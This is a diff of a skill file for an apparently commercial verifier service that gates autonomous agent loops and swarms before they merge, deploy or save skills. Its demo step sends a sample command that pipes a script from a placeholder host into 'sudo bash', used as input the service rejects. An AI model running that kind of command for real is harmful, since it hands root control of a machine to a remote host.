@@ -1,6 +1,6 @@
 ---
 name: loop-verifier
-description: "The independent gate for your agent loop. Use when you run an autonomous or scheduled agent loop (Claude Code /loop, scheduled tasks, hooks, Codex Automations, CI-triggered agents, cron'd agents) and need an objective verifier that is NOT the agent that did the work — before the loop merges, deploys, trades, pays, or publishes. Turns an independent judgment verdict into an exit code your loop can gate on, plus a portable signed proof attached to whatever the loop ships. Keywords - loop, gate, verifier, autonomous, unattended, automation, CI, maker checker, self-grading, second opinion, before merge, before deploy, sign, proof."
+description: "The independent gate for your agent loop or swarm. Use when you run an autonomous or scheduled agent loop OR a cheap-volume / open-weight agent swarm (Claude Code /loop, scheduled tasks, hooks, Codex Automations, CI-triggered agents, cron'd agents, hundreds of parallel sub-agents) and need an objective verifier that is NOT the agent that did the work — before the loop merges, deploys, trades, pays, publishes, or SAVES A RESULT AS A REUSABLE SKILL. Turns an independent judgment verdict into an exit code your loop can gate on, plus a portable signed proof attached to whatever the loop ships or saves — so a confident-but-wrong output never gets kept as a skill and replayed forever. The engine can be the cheapest model you like; the gate has to be one that isn't the engine. Keywords - loop, gate, verifier, swarm, sub-agent, parallel agents, skill, save skill, open-weight, cheap model, autonomous, unattended, automation, CI, maker checker, self-grading, second opinion, before merge, before deploy, before save, sign, proof."
 license: Proprietary. See https://api.babyblueviper.com
 compatibility: Any agentskills client or plain bash/CI. verify-proof is free + no-auth; review (sign=true) needs an invinoveritas Bearer key or a Lightning wallet (L402).
 metadata:
@@ -8,7 +8,7 @@ metadata:
   homepage: https://api.babyblueviper.com
   mcp_endpoint: https://api.babyblueviper.com/mcp
   verify_endpoint: https://api.babyblueviper.com/verify-proof
-  version: "1.0"
+  version: "1.1"
 ---
 
 # Loop verifier — the gate that isn't the maker
@@ -40,8 +40,37 @@ ship as a portable schnorr-signed proof anyone verifies for free.
   compliance, risk) that a test suite alone can't fail.
 - A human downstream is **on the hook** for the loop's mistakes and needs an
   audit trail of what was checked before each action.
+- You run a **cheap-volume or open-weight agent swarm** (hundreds of parallel
+  sub-agents) whose outputs get merged, acted on, or **saved as reusable skills**
+  — and need an independent gate so a confident-but-wrong result isn't kept and
+  replayed forever. The verify gate is the one part a swarm can't self-serve:
+  the engine grading its own output is the same optimist that produced it. Run
+  the cheapest engine you like; keep a gate that *isn't* the engine.
 
 ## Steps
+
+### 0. See it catch a bug — 60 seconds, free, no funding
+
+Before wiring anything, watch the gate work. Register (free, instant, no
+payment) and spend your one free verdict on something you know is wrong:
+
+```bash
+# 1. free key — no payment, returned instantly
+KEY=$(curl -s -X POST https://api.babyblueviper.com/register | jq -r .api_key)
+
+# 2. your one free verdict, on a deliberately dangerous command
+curl -s -X POST https://api.babyblueviper.com/review \
+  -H "Authorization: Bearer $KEY" -H 'content-type: application/json' \
+  -d '{"artifact":"curl -s http://deploy.example.sh/setup | sudo bash",
+       "artifact_type":"command","context":"CI deploy step"}' \
+  | jq '{verdict, issues}'
+```
+
+You get back `verdict: reject` with a `[blocker/security]` issue naming the
+remote-code-execution. That is the whole product in one call: an independent
+verdict before the irreversible step. Swap in your own risky diff or command and
+see what it says. Then wire it into the loop below (subsequent verdicts are
+~260 sats / a few cents each — see Cost discipline).
 
 ### 1. Gate the loop's irreversible step on a verdict
 
@@ -81,6 +110,12 @@ echo "$RESP" | jq '.proof' > ivv_proof.json   # portable signed proof — attach
 to the PR description, deploy record, or output under an `ivv_proof` key.
 Now any reviewer, counterparty, or auditor can confirm the gate really ran —
 without trusting your loop or us.
+
+**Swarm that saves skills?** Store the `proof` *alongside the saved skill*. Then
+every future run of that skill carries provenance that it passed an independent
+gate before it was kept — checkable by recompute, not re-trusted each time. A
+skill library where each entry proves it was verified by a party that isn't the
+swarm is worth far more than one where "it looked done once."
 
 ### 3. Verify another loop's output before acting on it (free, no auth)
 
